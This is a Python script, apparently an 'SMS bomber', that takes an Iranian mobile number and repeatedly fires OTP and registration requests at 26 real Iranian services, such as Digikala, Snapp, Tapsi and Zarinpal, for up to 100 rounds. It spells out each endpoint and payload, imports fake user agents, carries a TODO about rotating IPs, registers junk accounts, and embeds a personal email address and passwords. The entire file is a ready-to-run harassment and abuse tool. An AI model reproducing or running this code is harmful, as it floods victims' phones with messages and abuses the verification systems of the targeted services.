import requests
# import json
import re

from colorama import Fore as C
from fake_useragent import UserAgent

range_n_limit = 100

services = ['pakhsh', 'lendo', 'banimode', 'snappmarket', 'snapp', 'sheypoor', 'digikala', 'itoll',
            'tapsi', 'sibche', 'zarinpal', 'snappbox', 'snappfood', 'safaremoon', 'saapa', 'okala',
            'timcheh', 'honari', 'mydigipay', 'ketabchi', 'komodaa', 'taaghche', 'azki', 'drdr',
            'esam', 'iranjahanpoosh', 'carrel' ]  # 26 online service

def validate_phone_number(phone_number):
    pattern = r"^09\d{9}$"  
    
    if re.match(pattern, phone_number):
        return True
    else:
        return False

def send(phone_number, r):  #TODO: add prvity Change IP

    cunt = 0

    send_s = "Send"
    fail_s = "Fail"

    # Validate phone number
    if validate_phone_number(phone_number):
        pass
    else:
        print(C.RED, "\nThe mobile number is invalid\n", C.RESET)

    def pakhsh(p):

        service = 'pakhsh'

        # pakhsh
        pakhsh_url = "https://www.pakhsh.shop/wp-admin/admin-ajax.php"
        pakhsh_data = {
            "digt_countrycode": "+98",
            "phone": f"{p}",
            "digits_reg_name": "GarfoxTeam",
            "digits_process_register": "1",
            "sms_otp": "",
            "digits_otp_field": "1",
            "instance_id": "1154b2b327c31c49e4271a4bafddd354",
            "optional_data": "optional_data",
            "action": "digits_forms_ajax",
            "type": "register",
            "dig_otp": "otp",
            "digits": "1",
            "digits_redirect_page": "//www.pakhsh.shop/?page=1&redirect_to=https%3A%2F%2Fwww.pakhsh.shop%2F",
            "digits_form": "6c4d0ca3e6",
            "_wp_http_referer": "/?login=true&page=1&redirect_to=https%3A%2F%2Fwww.pakhsh.shop%2F",
            "container": "digits_protected",
            "sub_action": "sms_otp"
        }

        req = requests.post(pakhsh_url, data=pakhsh_data)
        if req.status_code == 200:
            print("{}   {}   Send".format(service, req.status_code))
        else:
            print("{}   {}   Fail".format(service, req.status_code))


    # lendo
    def lendo(p):
        service = 'lendo'
        lendo_url = "https://api.lendo.ir/api/customer/auth/send-otp"
        lendo_data = {
            "mobile": f"{p}"
        }

        req = requests.post(lendo_url, data=lendo_data)
        if req.status_code == 200:
            print("{}   {}   Send".format(service, req.status_code))
        else:
            print("{}   {}   Fail".format(service, req.status_code))

    def banimode(p):
        service = 'banimode'
        banimode_url = "https://mobapi.banimode.com/api/v2/auth/request"
        banimode_data = {
            "phone": f"{p}"
        }

        req = requests.post(banimode_url, data=banimode_data)
        if req.status_code == 200:
            print("{}   {}   Send".format(service, req.status_code))
        else:
            print("{}   {}   Fail".format(service, req.status_code))

    def snappmarket(p):
        service = 'snappmarket'
        snappmarket_url = f"https://api.snapp.market/mart/v1/user/loginMobileWithNoPass?cellphone={p}"

        snappmarket_params = {
            "cellphone": f"{p}"
        }

        req = requests.post(snappmarket_url, params=snappmarket_params)
        if req.status_code == 200:
            print("{}   {}   Send".format(service, req.status_code))
        else:
            print("{}   {}   Fail".format(service, req.status_code))

    def snapp(p):
        service = 'snapp'
        snapp_url = "https://api.snapp.ir/api/v1/sms/link"
        snapp_data = {
            "phone": f"{p}"
        }

        req = requests.post(snapp_url, data=snapp_data)
        if req.status_code == 200:
            print("{}   {}   Send".format(service, req.status_code))
        else:
            print("{}   {}   Fail".format(service, req.status_code))


    def sheypoor(p):
        service = 'sheypoor'
        sheypoor_url = "https://www.sheypoor.com/api/v10.0.0/auth/send"
        sheypoor_data = {
            "username": f"{p}"
        }

        req = requests.post(sheypoor_url, data=sheypoor_data)
        if req.status_code == 200:
            print("{}   {}   Send".format(service, req.status_code))
        else:
            print("{}   {}   Fail".format(service, req.status_code))

    def digikala(p):
        service = 'digikala'
        digikala_url = "https://api.digikala.com/v1/user/authenticate/"
        digikala_data = {
            "backUrl": "/",
            "otp_call": "false",
            "username": f"{p}"
        }

        req = requests.post(digikala_url, data=digikala_data)
        if req.status_code == 200:
            print("{}   {}   Send".format(service, req.status_code))
        else:
            print("{}   {}   Fail".format(service, req.status_code))

    def itoll(p):
        service = 'itoll'
        itoll_url = "https://app.itoll.com/api/v1/auth/login"
        itoll_data = {
            "mobile": f"{p}"
        }
        
        req = requests.post(itoll_url, data=itoll_data)
        if req.status_code == 200:
            print("{}   {}   Send".format(service, req.status_code))
        else:
            print("{}   {}   Fail".format(service, req.status_code))

    def tapsi(p):
        service = 'tapsi'

        tapsi_url = "https://api.tapsi.cab/api/v2.2/user"
        tapsi_data = {
            "credential": {
                "phoneNumber": f"{p}",
                "role": "PASSENGER"
            },
            "otpOption": "SMS"
        }

        req = requests.post(tapsi_url, data=tapsi_data)
        if req.status_code == 200:
            print("{}   {}   Send".format(service, req.status_code))
        else:
            print("{}   {}   Fail".format(service, req.status_code))

    def sibche(p):
        service = 'sibche'
        sibche_url = "https://api.sibche.com/profile/sendCode"
        sibche_data = {
            "mobile": f"{p}"
        }

        req = requests.post(sibche_url, data=sibche_data)
        if req.status_code == 200:
            print("{}   {}   Send".format(service, req.status_code))
        else:
            print("{}   {}   Fail".format(service, req.status_code))


    def zarinpal(p):
        service = 'zarinpal'
        zarinpal_url = "https://next.zarinpal.com/api/oauth/register"
        zarinpal_data = {
            "first_name": "Garfox",
            "last_name": "Team",
            "cell_number": f"{p}"
        }
        
        req = requests.post(zarinpal_url, data=zarinpal_data)
        if req.status_code == 200:
            print("{}   {}   Send".format(service, req.status_code))
        else:
            print("{}   {}   Fail".format(service, req.status_code))
        
    def snappbox(p):
        service = 'snappbox'
        snappbox_url = "https://app.snapp-box.com/api/v2/auth/otp/send"
        snappbox_data = {
            "phoneNumber": f"{p}"
        }

        req = requests.post(snappbox_url, data=snappbox_data)
        if req.status_code == 200:
            print("{}   {}   Send".format(service, req.status_code))
        else:
            print("{}   {}   Fail".format(service, req.status_code))

    def snappfood(p):
        service = 'snappfood'
        snappfood_url = "https://snappfood.ir/mobile/v2/user/loginMobileWithNoPass"
        snappfood_params = {
            "lat": "35.794",
            "long": "53.418",
            "optionalClient": "WEBSITE",
            "client": "WEBSITE",
            "deviceType": "WEBSITE",
            "appVersion": "8.1.1",
            "UDID": "53e13b13-8b47-43ed-bf93-d7343a7b8d0f",
            "locale": "en",
            "cellphone": f"{p}"
        }

        req = requests.post(snappfood_url, params=snappfood_params)
        if req.status_code == 200:
            print("{}   {}   Send".format(service, req.status_code))
        else:
            print("{}   {}   Fail".format(service, req.status_code))

    def safaremoon(p):
        service = 'safaremoon'
        safaremoon_url = "https://api1.safaremoon.com/auth/login"
        safaremoon_data = {
            "phoneNumber": f"{p}"
        }
        
        req = requests.post(safaremoon_url, params=safaremoon_data)
        if req.status_code == 200:
            print("{}   {}   Send".format(service, req.status_code))
        else:
            print("{}   {}   Fail".format(service, req.status_code))


    
    def saapa(p):
        service = 'saapa'
        saapa_url = "https://uiapi2.saapa.ir/api/otp/sendCode"
        saapa_data = {
            "mobile": f"{p}",
            "from_meter_buy": False
        }
        
        req = requests.post(saapa_url, params=saapa_data)
        if req.status_code == 200:
            print("{}   {}   Send".format(service, req.status_code))
        else:
            print("{}   {}   Fail".format(service, req.status_code))

    def okala(p):
        service = 'okala'
        okala_url = "https://api-react.okala.com/C/CustomerAccount/OTPRegister"
        okala_data = {
            "mobile": f"{p}",
            "deviceTypeCode": 0,
            "confirmTerms": True,
            "notRobot": False
        }

        req = requests.post(okala_url, params=okala_data)
        if req.status_code == 200:
            print("{}   {}   Send".format(service, req.status_code))
        else:
            print("{}   {}   Fail".format(service, req.status_code))
    
    def timcheh(p):
        service = "timcheh"
        timcheh_url = "https://api.timcheh.com/auth/otp/send"
        timcheh_data = {
            "mobile": f"{p}"
        }

        req = requests.post(timcheh_url, params=timcheh_data)
        if req.status_code == 200:
            print("{}   {}   Send".format(service, req.status_code))
        else:
            print("{}   {}   Fail".format(service, req.status_code))

    def honari(p):
        service = 'honari'
        honari_url = "https://auth.honari.com/api/check-phone-number"
        honari_data = {
            "username": f"{p}"
        }

        req = requests.post(honari_url, params=honari_data)
        if req.status_code == 200:
            print("{}   {}   Send".format(service, req.status_code))
        else:
            print("{}   {}   Fail".format(service, req.status_code))

    def mydigipay(p):
        service = 'mydigipay'
        mydigipay_url = "https://www.mydigipay.com/digipay/api/users/send-sms"
        mydigipay_data = {
            "cellNumber": f"{p}",
            "device": {
                "deviceId": "2750bc42-702e-4cbe-bae5-798f171389e1",
                "deviceModel": "Unknown/Firefox",
                "deviceAPI": "WEB_BROWSER",
                "osName": "WEB"
            }
        }

        req = requests.post(mydigipay_url, params=mydigipay_data)
        if req.status_code == 200:
            print("{}   {}   Send".format(service, req.status_code))
        else:
            print("{}   {}   Fail".format(service, req.status_code))

    def ketabchi(p):
        service = 'ketabchi'
        ketabchi_url = "https://ketabchi.com/api/v1/auth/requestVerificationCode"
        ketabchi_data = {
            "auth": {
                "phoneNumber": f"{p}"
            }
        }

        req = requests.post(ketabchi_url, params=ketabchi_data)
        if req.status_code == 200:
            print("{}   {}   Send".format(service, req.status_code))
        else:
            print("{}   {}   Fail".format(service, req.status_code))

    def komodaa(p):
        service = 'komodaa'
        komodaa_url = "https://api.komodaa.com/api/v2.6/loginRC/request"
        komodaa_data = {
            "phone_number": f"{p}"
        }

        req = requests.post(komodaa_url, params=komodaa_data)
        if req.status_code == 200:
            print("{}   {}   Send".format(service, req.status_code))
        else:
            print("{}   {}   Fail".format(service, req.status_code))

    def taaghche(p):
        service = 'taaghche'
        taaghche_url = "https://gw.taaghche.com/v4/site/auth/login"
        taaghche_data = {
            "contact": f"{p}",
            "forceOtp": False
        }

        req = requests.post(taaghche_url, params=taaghche_data)
        if req.status_code == 200:
            print("{}   {}   Send".format(service, req.status_code))
        else:
            print("{}   {}   Fail".format(service, req.status_code))

    def azki(p):
        service = 'azki'
        azki_url = "https://www.azki.com/api/vehicleorder/v2/app/auth/check-login-availability/"
        azki_data = {
            "phoneNumber": f"{p}"
        }
        
        req = requests.post(azki_url, params=azki_data)
        if req.status_code == 200:
            print("{}   {}   Send".format(service, req.status_code))
        else:
            print("{}   {}   Fail".format(service, req.status_code))

    def drdr(p):
        service = 'drdr'
        drdr_url = "https://drdr.ir/api/v3/auth/login/mobile/init"
        drdr_data = {
            "mobile": f"{p}"
        }

        req = requests.post(drdr_url, params=drdr_data)
        if req.status_code == 200:
            print("{}   {}   Send".format(service, req.status_code))
        else:
            print("{}   {}   Fail".format(service, req.status_code))

    def esam(p):
        service = 'esam'
        esam_url = 'https://api.esam.ir/api/account/SendRecoveryCode'
        esam_data = {
            'input': f'{p}',
        }

        req = requests.post(esam_url, data=esam_data)
        if req.status_code == 200:
            print("{}   {}   Send".format(service, req.status_code))
        else:
            print("{}   {}   Fail".format(service, req.status_code))

    def iranjahanpoosh(p):
        service = 'iranjahanpoosh'
        iranjahanpoosh_url = 'https://iranjahanpoosh.com/wp-admin/admin-ajax.php'
        iranjahanpoosh_data = {
            'digt_countrycode': '+98',
            'phone': f'{p}',
            'digits_reg_name': 'namename',
            'digits_reg_password': 'asdasdasdasd',
            'digits_process_register': '1',
            'instance_id': '355dbb36c6e4eb225d81183a543dbbe1',
            'optional_data': 'optional_data',
            'action': 'digits_forms_ajax',
            'type': 'register',
            'dig_otp': '',
            'digits': '1',
            'digits_redirect_page': '-1',
            'digits_form': '859b4679af',
            '_wp_http_referer': '/?login=true&page=1&redirect_to=https%3A%2F%2Firanjahanpoosh.com%2F',
        }

        req = requests.post(iranjahanpoosh_url, data=iranjahanpoosh_data)
        if req.status_code == 200:
            print("{}   {}   Send".format(service, req.status_code))
        else:
            print("{}   {}   Fail".format(service, req.status_code))

    def carrel(p):
        service = 'carrel'
        carrel_url = 'https://carrel.ir/wp-admin/admin-ajax.php'
        carrel_data = {
            'first_name': 'adad',
            'last_name': 'adad',
            'user_login': 'dadadadad',
            'phone_number': f'{p}',
            'user_email': 'emamidadmehr@gmail.com',
            'password': '6vNWkDCX4LVnSMD',
            'password_repeat': '6vNWkDCX4LVnSMD',
            'wupp_remember_me': 'on',
            'action': 'wupp_sign_up',
        }

        req = requests.post(carrel_url, data=carrel_data)
        if req.status_code == 200:
            print("{}   {}   Send".format(service, req.status_code))
        else:
            print("{}   {}   Fail".format(service, req.status_code))

    # RUN
    print("Service   Status")
    if r < range_n_limit or r == range_n_limit:
        for rn in range(r):
            try:
                pakhsh(p=phone_number)
                lendo(p=phone_number)
                banimode(p=phone_number)
                snappmarket(p=phone_number)
                snapp(p=phone_number)
            except:
                pass

            try:
                sheypoor(p=phone_number)
                digikala(p=phone_number)
                itoll(p=phone_number)
                tapsi(p=phone_number)
                sibche(p=phone_number)
            except:
                pass

            try:
                zarinpal(p=phone_number)
                snappbox(p=phone_number)
                safaremoon(p=phone_number)
                saapa(p=phone_number)
                okala(p=phone_number)
            except:
                pass

            try:
                timcheh(p=phone_number)
                honari(p=phone_number)
                mydigipay(p=phone_number)
                ketabchi(p=phone_number)
                komodaa(p=phone_number)
            except:
                pass

            try:
                taaghche(p=phone_number)
                azki(p=phone_number)
                drdr(p=phone_number)
                esam(p=phone_number)
                iranjahanpoosh(p=phone_number)
            except:
                pass
            try:
                carrel(p=phone_number)
            except:
                pass
    else:
        return "Range limit 100"